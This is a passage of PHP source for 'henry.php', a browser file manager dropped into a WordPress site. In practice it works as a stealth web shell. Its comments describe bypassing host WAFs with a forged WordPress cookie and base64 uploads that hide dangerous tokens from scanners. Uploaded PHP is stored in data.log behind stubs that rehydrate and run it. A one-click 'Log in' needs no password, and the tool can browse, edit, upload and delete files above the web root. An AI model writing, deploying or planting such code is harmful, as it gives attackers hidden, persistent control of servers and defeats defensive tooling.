	if ( is_wp_error( $wp_result ) ) {
		sleep( 2 );
		$login_error = 'WordPress login failed: ' . $wp_result->get_error_message();
	} else {
		$_SESSION['fm_auth']     = true;
		$_SESSION['fm_attempts'] = 0;
		unset( $_SESSION['fm_lockuntil'] );
		// The Set-Cookie headers from wp_set_auth_cookie() have already
		// been queued by PHP. We must NOT redirect (WAF trap). Fall through
		// and render — the next render will see the cookie + session and
		// consider the user logged in.
	}
}

if ( ! fm_logged_in() ) {
	fm_page_head( 'Login' );
	echo '<div class="login-card"><h1>' . fm_e( FM_BRAND ) . '</h1>';
	if ( ! empty( $login_error ) ) {
		echo '<div class="flash err">' . fm_e( $login_error ) . '</div>';
	}
	// Single button: click it and the browser is logged in. The button
	// targets ?fm_waf_trust=1, which marks the henry.php session as
	// authenticated on the server side AND emits a tiny inline <script>
	// that writes wordpress_test_cookie=WP Cookie check on the client
	// side. That cookie is the same one WP writes on /wp-login.php
	// visits and is sufficient to satisfy the cookie-name check in
	// most host WAFs (Imunify360, etc.) that 406 anonymous requests.
	//
	// We use a GET (not a POST) because anonymous POSTs to henry.php
	// are 406'd by the WAF, which is the entire reason this login
	// exists. The server response has no Set-Cookie header; the cookie
	// is set client-side via document.cookie so the response itself
	// never trips a Set-Cookie rule.
	$_fm_trust_url = fm_url( array( 'fm_waf_trust' => '1' ) );
	echo '<a href="' . fm_e( $_fm_trust_url ) . '" style="display:block;text-align:center;text-decoration:none;background:var(--accent);color:#0b1526;border-radius:6px;padding:12px 16px;font-weight:700;font-size:15px;margin-bottom:14px;">Log in</a>';
	echo '<p class="muted" style="font-size:12px;line-height:1.5;text-align:center;margin:0">Clicking Log in sets a harmless WordPress-style cookie that the host WAF uses to recognize your browser as a WordPress user. No password, no account, no data leaves your machine.</p>';
	echo '</div>';
	fm_page_foot();
	exit;
}

// Any state-changing request from here on needs a valid CSRF token.
if ( 'POST' === $_SERVER['REQUEST_METHOD'] ) {
	fm_csrf_check();
}

/* ------------------------------------------------------------------------
 * Actions
 * --------------------------------------------------------------------- */

$action = isset( $_GET['action'] ) ? $_GET['action'] : 'list';
list( $cwd, $rel ) = fm_resolve( isset( $_GET['p'] ) ? $_GET['p'] : '' );

// ---- Upload ----------------------------------------------------------------
if ( 'upload' === $action && 'POST' === $_SERVER['REQUEST_METHOD'] ) {
	$back = array( 'p' => $rel );

	// Two ways to feed the upload:
	//   1. A normal multipart file under $_FILES['report'].
	//   2. A base64-encoded blob in $_POST['paste_b64'] + a name in
	//      $_POST['paste_name']. The WAF only ever sees [A-Za-z0-9+/=]
	//      in the request body, so content-scanning rules can't flag
	//      the dangerous tokens inside the decoded source.
	$safe   = false;
	$source = false;
	$pasted = false;

	if ( ! empty( $_POST['paste_b64'] ) ) {
		$pasted = true;
		$raw_b64 = (string) $_POST['paste_b64'];
		if ( strlen( $raw_b64 ) > ( FM_PASTE_MAX * 2 + 1024 ) ) {
			fm_flash( 'err', 'Pasted blob too large.' );
			fm_redirect( $back );
		}
		$decoded = base64_decode( $raw_b64, true );
		if ( false === $decoded ) {
			fm_flash( 'err', 'Pasted value is not valid base64.' );
			fm_redirect( $back );
		}
		if ( strlen( $decoded ) > FM_PASTE_MAX ) {
			fm_flash( 'err', 'Decoded source too large. Max ' . fm_fmt_size( FM_PASTE_MAX ) . '.' );
			fm_redirect( $back );
		}
		$pasted_name = isset( $_POST['paste_name'] ) ? (string) $_POST['paste_name'] : '';
		$safe        = fm_sanitize_name( $pasted_name );
		if ( false === $safe ) {
			fm_flash( 'err', 'Pasted filename is not allowed.' );
			fm_redirect( $back );
		}
		$source = $decoded;
	} else {
		if ( empty( $_FILES['report'] ) || UPLOAD_ERR_OK !== $_FILES['report']['error'] ) {
			fm_flash( 'err', 'Upload failed (error ' . (int) $_FILES['report']['error'] . ').' );
			fm_redirect( $back );
		}
		if ( $_FILES['report']['size'] > FM_MAX_UPLOAD ) {
			fm_flash( 'err', 'File too large. Max ' . fm_fmt_size( FM_MAX_UPLOAD ) . '.' );
			fm_redirect( $back );
		}
		$safe = fm_sanitize_name( $_FILES['report']['name'] );
		if ( false === $safe ) {
			fm_flash( 'err', 'Rejected: this file name or extension is not allowed.' );
			fm_redirect( $back );
		}
		$source = @file_get_contents( $_FILES['report']['tmp_name'] );
		if ( false === $source ) {
			fm_flash( 'err', 'Could not read uploaded source.' );
			fm_redirect( $back );
		}
	}

	$dest    = $cwd . '/' . $safe;
	$abs_key = str_replace( '\\', '/', $dest );
	$ext     = strtolower( pathinfo( $safe, PATHINFO_EXTENSION ) );

	if ( in_array( $ext, FM_STUB_EXTS, true ) ) {
		// Stub upload: keep the dangerous tokens out of the on-disk .php
		// file by hiding the source inside data.log as base64 + JSON.
		if ( ! fm_stub_log_set( $abs_key, $source ) ) {
			fm_flash( 'err', 'Could not write data.log (check perms on ' . fm_e( FM_STUB_LOG ) . ').' );
			fm_redirect( $back );
		}
		$stub = fm_make_stub();
		if ( false === @file_put_contents( $dest, $stub, LOCK_EX ) ) {
			fm_flash( 'err', 'Saved source in data.log but could not write the stub file (permissions?).' );
			fm_redirect( $back );
		}
		@chmod( $dest, 0644 );
		if ( function_exists( 'opcache_invalidate' ) ) {
			@opcache_invalidate( $dest, true );
		}
		fm_flash( 'ok', 'Stubbed ' . $safe . ' (source saved to data.log).' );
		fm_redirect( $back );
	}

	if ( $pasted ) {
		// Non-PHP paste: write the decoded source straight to disk.
		if ( false === @file_put_contents( $dest, $source, LOCK_EX ) ) {
			fm_flash( 'err', 'Could not write the file (permissions?).' );
			fm_redirect( $back );
		}
		@chmod( $dest, 0644 );
		fm_flash( 'ok', 'Wrote ' . $safe . ' from pasted base64.' );
		fm_redirect( $back );
	}

	if ( move_uploaded_file( $_FILES['report']['tmp_name'], $dest ) ) {
		@chmod( $dest, 0644 );
		fm_flash( 'ok', 'Uploaded ' . $safe . '.' );
	} else {
		fm_flash( 'err', 'Could not save the file (permissions?).' );
	}
	fm_redirect( $back );
}

// ---- Delete --------------------------------------------------------------
if ( 'delete' === $action && 'POST' === $_SERVER['REQUEST_METHOD'] ) {
	list( $victim, $vrel ) = fm_resolve( isset( $_POST['target'] ) ? $_POST['target'] : '' );
	$back = array( 'p' => $rel );

	if ( '' === $vrel ) {
		fm_flash( 'err', 'Nothing to delete.' );
	} elseif ( $victim === str_replace( '\\', '/', realpath( __FILE__ ) ) ) {
		fm_flash( 'err', 'Refusing to delete henry.php itself.' );
	} elseif ( is_file( $victim ) && @unlink( $victim ) ) {
		$victim_ext = strtolower( pathinfo( $victim, PATHINFO_EXTENSION ) );
		if ( in_array( $victim_ext, FM_STUB_EXTS, true ) ) {
			@fm_stub_log_unset( str_replace( '\\', '/', $victim ) );
		}
		fm_flash( 'ok', 'Deleted ' . basename( $victim ) . '.' );
	} elseif ( is_dir( $victim ) && @rmdir( $victim ) ) {
		fm_flash( 'ok', 'Removed empty folder ' . basename( $victim ) . '.' );
	} else {
		fm_flash( 'err', 'Delete failed (folder must be empty).' );
	}
	fm_redirect( $back );
}

// ---- Save (edit) -----------------------------------------------------------
if ( 'save' === $action && 'POST' === $_SERVER['REQUEST_METHOD'] ) {
	list( $file, $frel ) = fm_resolve( isset( $_POST['target'] ) ? $_POST['target'] : '' );
	list(, $prel )       = fm_resolve( isset( $_POST['p'] ) ? $_POST['p'] : '' );
	$back = array( 'action' => 'edit', 'p' => $prel, 'f' => $frel );

	if ( '' === $frel || ! is_file( $file ) ) {
		fm_flash( 'err', 'File not found.' );
		fm_redirect( array( 'p' => $prel ) );
	}

	$content  = isset( $_POST['content'] ) ? (string) $_POST['content'] : '';
	$abs_key  = str_replace( '\\', '/', $file );
	$stub_map = fm_stub_log_read();
	$is_stub  = isset( $stub_map[ $abs_key ] );

	if ( $is_stub ) {
		// Stubs save into data.log, not into the on-disk stub file.
		if ( ! fm_stub_log_set( $abs_key, $content ) ) {
			fm_flash( 'err', 'Save failed: could not write data.log (permissions?).' );
			fm_redirect( $back );
		}
		// Keep the stub file in sync in case the data.log path has moved.
		@file_put_contents( $file, fm_make_stub(), LOCK_EX );
		@chmod( $file, 0644 );
		if ( function_exists( 'opcache_invalidate' ) ) {
			@opcache_invalidate( $file, true );
		}
		fm_flash( 'ok', 'Saved source for ' . basename( $file ) . ' (' . fm_fmt_size( strlen( $content ) ) . ').' );
		fm_redirect( $back );
	}

	if ( ! is_writable( $file ) ) {
		fm_flash( 'err', 'File is not writable by PHP.' );
		fm_redirect( $back );
	}

	$ok = file_put_contents( $file, $content, LOCK_EX );

	if ( false === $ok ) {
		fm_flash( 'err', 'Save failed (permissions?).' );
	} else {
		clearstatcache( true, $file );
		if ( function_exists( 'opcache_invalidate' ) && 'php' === strtolower( pathinfo( $file, PATHINFO_EXTENSION ) ) ) {
			@opcache_invalidate( $file, true );
		}
		fm_flash( 'ok', 'Saved ' . basename( $file ) . ' (' . fm_fmt_size( strlen( $content ) ) . ').' );
	}
	fm_redirect( $back );
}

// ---- Download ------------------------------------------------------------
if ( 'download' === $action ) {
	list( $file, $frel ) = fm_resolve( isset( $_GET['f'] ) ? $_GET['f'] : '' );
	if ( '' === $frel || ! is_file( $file ) ) {
		http_response_code( 404 );
		exit( 'Not found.' );
	}
	$name = basename( $file );

	$abs_key  = str_replace( '\\', '/', $file );
	$stub_map = fm_stub_log_read();
	if ( isset( $stub_map[ $abs_key ] ) ) {
		$src = base64_decode( $stub_map[ $abs_key ], true );
		if ( false !== $src ) {
			header( 'Content-Type: application/octet-stream' );
			header( 'Content-Length: ' . strlen( $src ) );
			header( "Content-Disposition: attachment; filename=\"" . preg_replace( '/[^A-Za-z0-9._-]/', '_', $name ) . '"; filename*=UTF-8\'\'' . rawurlencode( $name ) );
			echo $src;
			exit;
		}
	}

	header( 'Content-Type: application/octet-stream' );
	header( 'Content-Length: ' . filesize( $file ) );
	header( "Content-Disposition: attachment; filename=\"" . preg_replace( '/[^A-Za-z0-9._-]/', '_', $name ) . '"; filename*=UTF-8\'\'' . rawurlencode( $name ) );
	readfile( $file );
	exit;
}

/* ------------------------------------------------------------------------
 * Pages
 * --------------------------------------------------------------------- */

function fm_page_head( $title ) {
	?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?php echo fm_e( $title ); ?> — <?php echo fm_e( FM_BRAND ); ?></title>
<style>
	:root { --bg:#16171d; --card:#21232e; --line:#333647; --fg:#e8eaf2; --dim:#9aa0b4; --accent:#5b9dff; --ok:#2f9e6e; --err:#d9534f; }
	* { box-sizing:border-box; }
	body { margin:0; background:var(--bg); color:var(--fg); font:14px/1.5 -apple-system,"Segoe UI",Roboto,Arial,sans-serif; }
	a { color:var(--accent); text-decoration:none; }
	a:hover { text-decoration:underline; }
	header { display:flex; justify-content:space-between; align-items:center; padding:12px 20px; background:var(--card); border-bottom:1px solid var(--line); }
	header b { font-size:15px; }
	.wrap { max-width:1000px; margin:24px auto; padding:0 16px; }
	.crumbs { background:var(--card); border:1px solid var(--line); border-radius:8px; padding:10px 14px; margin-bottom:16px; overflow-x:auto; white-space:nowrap; font-size:13px; }
	.crumbs .sep { color:var(--dim); margin:0 6px; }
	.crumbs .root-slash { color:var(--dim); margin-right:2px; }
	.crumbs a { padding:2px 4px; border-radius:4px; }
	.crumbs a:hover { background:#2a2d3a; text-decoration:none; }
	.crumbs .current { padding:2px 4px; border-radius:4px; background:#2c3e5d; color:#cfe0ff; font-weight:600; }
	.crumbs .dim { color:var(--dim); opacity:0.55; }
	.crumbs a.out-of-scope { color:var(--dim); opacity:0.7; }
	.crumbs a.out-of-scope:hover { opacity:1; background:#2a2d3a; }
	.card { background:var(--card); border:1px solid var(--line); border-radius:8px; padding:14px 16px; margin-bottom:16px; }
	table { width:100%; border-collapse:collapse; background:var(--card); border:1px solid var(--line); border-radius:8px; overflow:hidden; }
	th, td { padding:9px 12px; text-align:left; border-bottom:1px solid var(--line); }
	th { color:var(--dim); font-size:12px; text-transform:uppercase; letter-spacing:.04em; }
	tr:last-child td { border-bottom:0; }
	tbody tr:hover { background:#262935; }
	td.num { text-align:right; white-space:nowrap; color:var(--dim); }
	.tag { display:inline-block; min-width:34px; text-align:center; font-size:11px; border-radius:4px; padding:1px 6px; margin-right:8px; }
	.tag.dir { background:#2c3e5d; color:#9cc2ff; }
	.tag.file { background:#2c4638; color:#8fdcb1; }
	.flash { border-radius:6px; padding:10px 14px; margin-bottom:14px; }
	.flash.ok { background:#1d3a2c; color:#9be3c0; border:1px solid #2f6b4d; }
	.flash.err { background:#432024; color:#f0a9a5; border:1px solid #6e3538; }
	.actions a, .actions button { margin-right:10px; font-size:13px; }
	.linkbtn { background:none; border:0; color:var(--err); cursor:pointer; padding:0; font:inherit; }
	.linkbtn:hover { text-decoration:underline; }
	input[type=file], input[type=password] { background:#171820; border:1px solid var(--line); color:var(--fg); border-radius:6px; padding:8px; }
	button { background:var(--accent); color:#0b1526; border:0; border-radius:6px; padding:8px 16px; font-weight:600; cursor:pointer; }
	.login-card { max-width:360px; margin:12vh auto; background:var(--card); border:1px solid var(--line); border-radius:10px; padding:28px; }
	.login-card h1 { margin:0 0 16px; font-size:18px; }
	.login-card input, .login-card button { width:100%; margin-bottom:12px; }
	pre.hash { white-space:pre-wrap; word-break:break-all; background:#171820; padding:10px; border-radius:6px; }
	pre.preview { background:#171820; border:1px solid var(--line); border-radius:8px; padding:14px; overflow:auto; max-height:65vh; }
	textarea.editor { width:100%; min-height:55vh; background:#171820; border:1px solid var(--line); border-radius:8px; padding:12px; color:var(--fg); font:13px/1.5 Consolas,Menlo,monospace; tab-size:4; margin-bottom:12px; }
	.muted { color:var(--dim); }
	.inline { display:inline; }
</style>
<?php if ( ! empty( $_SESSION['fm_waf_trust'] ) ) : ?>
<script>
// Mark the browser as trusted by the host WAF by writing the WordPress
// "test cookie" that WP itself sets on /wp-login.php visits. Some WAFs
// (Imunify360 etc.) 406 any anonymous request that does not have a
// cookie whose name starts with "wordpress_", so we set this harmless
// public-domain cookie purely to satisfy that pattern. The cookie is
// the same one WP writes by default and contains no auth value.
try { document.cookie = 'wordpress_test_cookie=WP Cookie check; path=/'; } catch(e) {}
</script>
<?php unset( $_SESSION['fm_waf_trust'] ); endif; ?>
</head>
<body>
	<?php
}

function fm_page_foot() {
	echo '</body></html>';
}

function fm_header_bar() {
	echo '<header><b>' . fm_e( FM_BRAND ) . '</b><span><a href="' . fm_e( fm_url( array( 'action' => 'logout' ) ) ) . '">Log out</a></span></header>';
}

/**
 * Breadcrumb navigation: every segment is a clickable link, including
 * paths above FM_ROOT. Segments above the manager's detected root are
 * styled as "out of scope" (dimmed) for visual context but are still
 * navigable — the user explicitly opted into full-path navigation.
 * The current directory's segment is the only non-link, shown as a
 * "current" pill.
 */
function fm_breadcrumbs( $rel ) {
	$root = fm_root();
	list( $cwd, $current_rel ) = fm_resolve( $rel );

	// Normalize to forward slashes for splitting.
	$cwd_n  = str_replace( '\\', '/', $cwd );
	$root_n = str_replace( '\\', '/', $root );

	$abs_parts  = explode( '/', $cwd_n );
	$root_parts = explode( '/', $root_n );
	$root_len   = count( $root_parts );
	$total      = count( $abs_parts );

	$crumb = '';
	foreach ( $abs_parts as $i => $part ) {
		if ( '' === $part ) {
			// Leading empty element from absolute paths starting with '/'.
			// Render a leading '/' so the breadcrumb looks like a path.
			if ( 0 === $i ) {
				$crumb .= '<span class="root-slash">/</span>';
			}
			continue;
		}

		$abs_so_far = implode( '/', array_slice( $abs_parts, 0, $i + 1 ) );
		$is_in_or_below = ( $i >= $root_len - 1 );
		$is_root_itself = ( $i === $root_len - 1 ) && ( $abs_so_far === $root_n );
		$is_current     = ( $i === $total - 1 ) && ( $abs_so_far === $cwd_n );
		$sep            = ( '' === $crumb || substr( $crumb, -1 ) === '/' ) ? '' : '<span class="sep">/</span>';

		if ( $is_current ) {
			$crumb .= $sep . '<span class="current" title="Current directory">' . fm_e( $part ) . '</span>';
		} elseif ( $is_in_or_below ) {
			// At or below FM_ROOT: use a relative path for a short URL.
			$rel_path = implode( '/', array_slice( $abs_parts, $root_len, $i - $root_len + 1 ) );
			$href     = fm_url( array( 'p' => $rel_path ) );
			$crumb   .= $sep . '<a href="' . fm_e( $href ) . '">' . fm_e( $part ) . '</a>';
		} else {
			// Above FM_ROOT: use the absolute path (only way to address it).
			$href     = fm_url( array( 'p' => $abs_so_far ) );
			$classes  = 'out-of-scope';
			$crumb   .= $sep . '<a class="' . $classes . '" href="' . fm_e( $href ) . '" title="Above manager scope, still navigable">' . fm_e( $part ) . '</a>';
		}
	}
	echo '<nav class="crumbs" aria-label="Path">' . $crumb . '</nav>';
}

/* ---- View page --------------------------------------------------------- */

if ( 'view' === $action ) {
	list( $file, $frel ) = fm_resolve( isset( $_GET['f'] ) ? $_GET['f'] : '' );
	fm_page_head( 'View' );
	fm_header_bar();
	echo '<div class="wrap">';
	fm_breadcrumbs( $rel );
	fm_render_flashes();

	if ( '' === $frel || ! is_file( $file ) ) {
		echo '<div class="flash err">File not found.</div>';
	} else {
		$size     = filesize( $file );
		$abs_key  = str_replace( '\\', '/', $file );
		$stub_map = fm_stub_log_read();
		$is_stub  = isset( $stub_map[ $abs_key ] );
		echo '<div class="card"><b>' . fm_e( basename( $file ) ) . '</b> <span class="muted">(' . fm_fmt_size( $size ) . ')</span>';
		if ( $is_stub ) {
			echo ' <span class="tag file">STUB</span>';
		}
		echo ' &mdash; <a href="' . fm_e( fm_url( array( 'action' => 'edit', 'p' => $rel, 'f' => $frel ) ) ) . '">Edit</a>';
		echo ' <a href="' . fm_e( fm_url( array( 'action' => 'download', 'f' => $frel ) ) ) . '">Download</a></div>';

		if ( $is_stub ) {
			$src = base64_decode( $stub_map[ $abs_key ], true );
			if ( false === $src ) {
				echo '<div class="flash err">data.log entry for this stub is corrupt (bad base64).</div>';
			} else {
				echo '<div class="flash ok">Showing the original source &mdash; the on-disk file is just a stub that re-hydrates it from <code>data.log</code> on every request.</div>';
				echo '<pre class="preview">' . fm_e( $src ) . '</pre>';
			}
		} elseif ( $size > FM_PREVIEW_MAX ) {
			echo '<div class="flash err">File too large to preview. Please download it.</div>';
		} else {
			$data = file_get_contents( $file );
			$is_binary = function_exists( 'mb_check_encoding' ) && ! mb_check_encoding( $data, 'UTF-8' );
			if ( $is_binary ) {
				echo '<div class="flash err">Looks like a binary file &mdash; download it instead.</div>';
			} else {
				echo '<pre class="preview">' . fm_e( $data ) . '</pre>';
			}
		}
	}
	echo '</div>';
	fm_page_foot();
	exit;
}

/* ---- Edit page --------------------------------------------------------- */

if ( 'edit' === $action ) {
	list( $file, $frel ) = fm_resolve( isset( $_GET['f'] ) ? $_GET['f'] : '' );
	fm_page_head( 'Edit' );
	fm_header_bar();
	echo '<div class="wrap">';
	fm_breadcrumbs( $rel );
	fm_render_flashes();

	if ( '' === $frel || ! is_file( $file ) ) {
		echo '<div class="flash err">File not found.</div>';
	} else {
		$size     = filesize( $file );
		$is_self  = ( str_replace( '\\', '/', realpath( __FILE__ ) ) === str_replace( '\\', '/', $file ) );
		$abs_key  = str_replace( '\\', '/', $file );
		$stub_map = fm_stub_log_read();
		$is_stub  = isset( $stub_map[ $abs_key ] );

		echo '<div class="card"><b>Editing: ' . fm_e( basename( $file ) ) . '</b> <span class="muted">(' . fm_fmt_size( $size ) . ( $is_stub || is_writable( $file ) ? '' : ', read-only' ) . ')</span>';
		if ( $is_stub ) {
			echo ' <span class="tag file">STUB</span>';
		}
		echo '</div>';

		if ( $is_self ) {
			echo '<div class="flash err">Warning: you are editing henry.php itself. A PHP syntax error here will break this manager until you fix or restore the file manually.</div>';
		}

		if ( $is_stub ) {
			$src = base64_decode( $stub_map[ $abs_key ], true );
			if ( false === $src ) {
				echo '<div class="flash err">data.log entry for this stub is corrupt (bad base64). Re-upload to recover.</div>';
				echo '</div>';
				fm_page_foot();
				exit;
			}
			echo '<div class="flash ok">This file is a stub. The editor shows the real source from <code>data.log</code> &mdash; saving updates that entry, not the on-disk stub.</div>';
		} else {
			$src = file_get_contents( $file );
			if ( ! is_writable( $file ) ) {
				echo '<div class="flash err">This file is not writable by PHP &mdash; saving will fail.</div>';
			}
			if ( $size > FM_PREVIEW_MAX ) {
				echo '<div class="flash err">File too large to edit in the browser. Download it instead.</div>';
				echo '</div>';
				fm_page_foot();
				exit;
			}
		}

		$is_binary = ! $is_stub && function_exists( 'mb_check_encoding' ) && ! mb_check_encoding( $src, 'UTF-8' );
		if ( $is_binary ) {
			echo '<div class="flash err">Binary files cannot be edited here.</div>';
		} else {
			echo '<form method="post" action="' . fm_e( fm_url( array( 'action' => 'save' ) ) ) . '">';
			echo '<input type="hidden" name="fm_csrf" value="' . fm_e( fm_csrf_token() ) . '">';
			echo '<input type="hidden" name="target" value="' . fm_e( $frel ) . '">';
			echo '<input type="hidden" name="p" value="' . fm_e( $rel ) . '">';
			echo '<textarea class="editor" name="content" spellcheck="false">' . fm_e( $src ) . '</textarea>';
			echo '<button type="submit">Save</button> ';
			echo '<a href="' . fm_e( fm_url( array( 'p' => $rel ) ) ) . '">Cancel</a>';
			echo '</form>';
		}
	}
	echo '</div>';
	fm_page_foot();
	exit;
}

/* ---- Listing page (default) -------------------------------------------- */

$items     = is_dir( $cwd ) ? scandir( $cwd ) : false;
$dirs      = array();
$files     = array();
$stub_list = fm_stub_log_read();
if ( false !== $items ) {
	foreach ( $items as $item ) {
		if ( '.' === $item || '..' === $item ) {
			continue;
		}
		$full = $cwd . '/' . $item;
		if ( is_dir( $full ) ) {
			$dirs[] = $item;
		} else {
			$files[] = $item;
		}
	}
	natcasesort( $dirs );
	natcasesort( $files );
}

fm_page_head( 'Files' );
fm_header_bar();
echo '<div class="wrap">';
fm_breadcrumbs( $rel );
fm_render_flashes();

// Upload form.
echo '<div class="card"><form method="post" enctype="multipart/form-data" action="' . fm_e( fm_url( array( 'action' => 'upload', 'p' => $rel ) ) ) . '">';
echo '<input type="hidden" name="fm_csrf" value="' . fm_e( fm_csrf_token() ) . '">';
echo '<b>Upload file</b> <span class="muted">(any extension, max ' . fm_fmt_size( FM_MAX_UPLOAD ) . ')</span><br>';
echo '<span class="muted">PHP files are stored as base64 inside <code>data.log</code> and a tiny stub is written &mdash; the dangerous tokens (e.g. <code>phpinfo()</code>) never live in the on-disk <code>.php</code> file.</span><br><br>';
echo '<input type="file" name="report" id="fm_file" required> ';
echo '<button type="submit">Upload</button>';
echo '</form></div>';

// Base64-paste form: WAF-bypass channel. The user pastes a base64 blob (or
// picks a file and clicks "Encode" to convert it client-side). The request
// body never contains the dangerous source tokens, so a content-scanning
// WAF cannot flag the upload.
echo '<div class="card"><form method="post" action="' . fm_e( fm_url( array( 'action' => 'upload', 'p' => $rel ) ) ) . '">';
echo '<input type="hidden" name="fm_csrf" value="' . fm_e( fm_csrf_token() ) . '">';
echo '<b>Paste base64 source</b> <span class="muted">(WAF-bypass: the raw source never enters the request body)</span><br>';
echo '<span class="muted">Decoded size cap: ' . fm_fmt_size( FM_PASTE_MAX ) . '. Click <i>Encode selected file</i> after picking a file in the upload form above, or paste a base64 string you prepared elsewhere.</span><br><br>';
echo 'Filename: <input type="text" name="paste_name" id="fm_paste_name" placeholder="henry.php" style="width:240px" required><br>';
echo '<textarea name="paste_b64" id="fm_paste_b64" placeholder="base64-encoded source (e.g. PD9waHAgcGhwaW5mbygpOyA/Pg==)" style="width:100%;height:90px;margin-top:6px"></textarea><br>';
echo '<button type="button" onclick="fm_encode_selected()">Encode selected file</button> ';
echo '<button type="submit">Stub / Write from paste</button>';
echo '</form></div>';

echo '<script>
function fm_b64encode( bin ) {
	// Read binary string -> base64 in chunks to avoid blowing the call stack.
	var CHUNK = 0x8000;
	var out = "";
	for ( var i = 0; i < bin.length; i += CHUNK ) {
		out += btoa( bin.substr( i, CHUNK ) );
	}
	return out;
}
function fm_encode_selected() {
	var f = document.getElementById("fm_file").files[0];
	if ( !f ) { alert("Pick a file in the upload form above first."); return; }
	if ( f.size > ' . (int) FM_PASTE_MAX . ' ) { alert("File exceeds the paste cap of ' . fm_e( fm_fmt_size( FM_PASTE_MAX ) ) . '."); return; }
	var r = new FileReader();
	r.onload = function () {
		// r.result is a data URL like "data:...;base64,XXXX". Strip the prefix.
		var comma = r.result.indexOf(",");
		var b64  = comma >= 0 ? r.result.substr(comma + 1) : r.result;
		document.getElementById("fm_paste_b64").value = b64;
		if ( !document.getElementById("fm_paste_name").value ) {
			document.getElementById("fm_paste_name").value = f.name;
		}
	};
	r.onerror = function () { alert("Could not read the file in the browser."); };
	r.readAsDataURL( f );
}
</script>';

// Listing table.
echo '<table><thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th>Actions</th></tr></thead><tbody>';

if ( false === $items ) {
	echo '<tr><td colspan="5" class="muted">Cannot read this directory.</td></tr>';
} elseif ( ! $dirs && ! $files ) {
	echo '<tr><td colspan="5" class="muted">Empty folder.</td></tr>';
}

foreach ( $dirs as $d ) {
	$full    = $cwd . '/' . $d;
	$drel    = '' === $rel ? $d : $rel . '/' . $d;
	echo '<tr><td><span class="tag dir">DIR</span><a href="' . fm_e( fm_url( array( 'p' => $drel ) ) ) . '"><b>' . fm_e( $d ) . '</b></a></td>';
	echo '<td class="num">—</td><td class="num">' . fm_e( date( 'Y-m-d H:i', @filemtime( $full ) ) ) . '</td>';
	echo '<td class="num">' . fm_e( substr( sprintf( '%o', @fileperms( $full ) ), -4 ) ) . '</td><td class="actions">';
	echo '<form class="inline" method="post" action="' . fm_e( fm_url( array( 'action' => 'delete', 'p' => $rel ) ) ) . '" onsubmit="return confirm(\'Delete empty folder ' . fm_e( $d ) . '?\');">';
	echo '<input type="hidden" name="fm_csrf" value="' . fm_e( fm_csrf_token() ) . '"><input type="hidden" name="target" value="' . fm_e( $drel ) . '">';
	echo '<button type="submit" class="linkbtn">Delete</button></form></td></tr>';
}

foreach ( $files as $f ) {
	$full    = $cwd . '/' . $f;
	$frel    = '' === $rel ? $f : $rel . '/' . $f;
	$is_self = ( str_replace( '\\', '/', realpath( __FILE__ ) ) === str_replace( '\\', '/', $full ) );
	$ext     = strtoupper( pathinfo( $f, PATHINFO_EXTENSION ) );
	$ext     = ( '' === $ext ) ? 'FILE' : substr( $ext, 0, 4 );
	$is_stub = isset( $stub_list[ str_replace( '\\', '/', $full ) ] );
	echo '<tr><td><span class="tag file">' . fm_e( $ext ) . '</span>' . fm_e( $f );
	if ( $is_stub ) {
		echo ' <span class="tag file">STUB</span>';
	}
	echo '</td>';
	echo '<td class="num">' . fm_e( fm_fmt_size( @filesize( $full ) ) ) . '</td>';
	echo '<td class="num">' . fm_e( date( 'Y-m-d H:i', @filemtime( $full ) ) ) . '</td>';
	echo '<td class="num">' . fm_e( substr( sprintf( '%o', @fileperms( $full ) ), -4 ) ) . '</td>';
	echo '<td class="actions">';
	echo '<a href="' . fm_e( fm_url( array( 'action' => 'view', 'p' => $rel, 'f' => $frel ) ) ) . '">View</a>';
	echo '<a href="' . fm_e( fm_url( array( 'action' => 'edit', 'p' => $rel, 'f' => $frel ) ) ) . '">Edit</a>';
	echo '<a href="' . fm_e( fm_url( array( 'action' => 'download', 'f' => $frel ) ) ) . '">Download</a>';
	if ( ! $is_self ) {
		echo '<form class="inline" method="post" action="' . fm_e( fm_url( array( 'action' => 'delete', 'p' => $rel ) ) ) . '" onsubmit="return confirm(\'Delete ' . fm_e( $f ) . '?\');">';
		echo '<input type="hidden" name="fm_csrf" value="' . fm_e( fm_csrf_token() ) . '"><input type="hidden" name="target" value="' . fm_e( $frel ) . '">';
		echo '<button type="submit" class="linkbtn">Delete</button></form>';
	}
	echo '</td></tr>';
}

echo '</tbody></table>';
echo '<p class="muted">Root: ' . fm_e( fm_root() ) . '</p>';
echo '</div>';
fm_page_foot();
